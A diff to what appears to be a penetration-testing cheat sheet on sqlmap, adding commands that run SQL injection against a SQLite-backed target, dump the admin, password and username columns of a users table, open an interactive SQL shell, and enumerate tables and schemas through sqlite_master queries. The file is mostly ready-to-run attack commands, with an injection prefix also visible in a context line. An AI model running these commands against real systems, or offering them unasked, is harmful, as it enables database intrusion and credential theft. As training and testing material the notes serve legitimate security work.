@@ -9,8 +9,19 @@ sqlmap -r ./sqlmap-03.txt --level=5 --risk=3 --batch --prefix=%bf%27 --dbms=mysq
 SQLite sample 
 -------------
 ```
-# NOTE: Notice the -D paramater is "SQLite_masterdb", this appears to be the default database for SQLite. 
+# NOTE: Notice the -D parameter is "SQLite_masterdb", this appears to be the default database for SQLite. 
+# Other possible -D parameter could be "main"
 sqlmap -r ./sqlmap-01.txt --dbms=SQLite --batch --level=5 --risk=3 -D SQLite_masterdb -T users -C admin,password,username --dump
+
+## Get --sql-shell
+sqlmap -r ./sqlmap-01.txt --dbms=SQLite --batch --level=5 --risk=3 -D SQLite_masterdb -T users -C admin,password,username --dump --sql-shell
+
+# List tables
+SELECT name FROM sqlite_master WHERE type='table';
+SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
+
+# Show tables and columns
+SELECT sql FROM sqlite_master
 ```
 
 SQLMap Tamper Data
